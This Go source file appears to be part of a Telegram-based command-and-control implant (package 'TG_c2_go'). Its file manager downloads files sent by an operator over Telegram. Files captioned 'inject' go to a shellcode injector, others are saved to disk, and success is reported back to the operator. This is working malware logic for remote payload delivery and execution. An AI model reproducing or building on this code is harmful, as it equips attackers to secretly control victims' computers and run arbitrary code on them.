package core

import (
	"fmt"
	"path/filepath"
	"strings"

	"TG_c2_go/config"
	"TG_c2_go/functions"
	"TG_c2_go/telegram"
)

// FileManager 文件管理器
type FileManager struct {
	client   *telegram.TelegramClient
	injector *functions.Injector
}

// NewFileManager 创建新的文件管理器
func NewFileManager() *FileManager {
	return &FileManager{
		client:   telegram.NewTelegramClient(),
		injector: functions.NewInjector(),
	}
}

// ProcessFile 处理文件下载和inject操作
func (fm *FileManager) ProcessFile(fileID string, fileType int, lastFileID *string, lastInjectFileID *string) (bool, error) {
	switch fileType {
	case 0: // inject文件
		return fm.processInjectFile(fileID, lastInjectFileID)
	case 1: // 普通文件
		return fm.processNormalFile(fileID, lastFileID)
	default:
		return false, fmt.Errorf("未知文件类型: %d", fileType)
	}
}

// processInjectFile 处理inject文件
func (fm *FileManager) processInjectFile(fileID string, lastInjectFileID *string) (bool, error) {
	// 检查是否是重复文件
	if *lastInjectFileID == fileID {
		fmt.Println("inject文件ID未变化，跳过处理")
		return false, nil
	}
	
	fmt.Printf("检测到新的inject文件: %s\\n", fileID)
	*lastInjectFileID = fileID
	
	// 执行inject逻辑
	fmt.Println("开始执行inject")
	err := fm.injector.InjectShellcode(fileID, fm.client)
	if err != nil {
		fmt.Printf("inject执行失败: %v\\n", err)
		return true, err
	}
	
	fmt.Println("inject文件处理完成")
	return true, nil
}

// processNormalFile 处理普通文件下载
func (fm *FileManager) processNormalFile(fileID string, lastFileID *string) (bool, error) {
	// 检查是否是重复文件
	if *lastFileID == fileID {
		fmt.Println("下载文件ID未变化")
		return false, nil
	}
	
	*lastFileID = fileID
	fmt.Printf("开始下载文件: %s\\n", fileID)
	
	// 获取文件下载URL和路径
	downloadURL, filePath, err := fm.client.GetFileDownloadURL(fileID)
	if err != nil {
		return true, fmt.Errorf("获取下载URL失败: %v", err)
	}
	
	fmt.Printf("下载URL: %s\\n", downloadURL)
	fmt.Printf("文件路径: %s\\n", filePath)
	
	// 生成保存路径
	fileName := filepath.Base(filePath)
	savePath := filepath.Join(config.OUTPUT_DIR, fileName)
	
	// 下载文件
	err = fm.client.DownloadFile(downloadURL, savePath)
	if err != nil {
		return true, fmt.Errorf("文件下载失败: %v", err)
	}
	
	fmt.Printf("文件下载成功: %s\\n", savePath)
	
	// 发送下载成功消息
	successMsg := fmt.Sprintf("文件下载成功: %s", savePath)
	if err := fm.client.SendMessage(successMsg); err != nil {
		fmt.Printf("发送成功消息失败: %v\\n", err)
	}
	
	return true, nil
}

// GetFileTypeFromCaption 根据caption判断文件类型
func (fm *FileManager) GetFileTypeFromCaption(caption string) int {
	if strings.EqualFold(caption, "inject") {
		return 0 // inject文件
	}
	return 1 // 普通文件
}
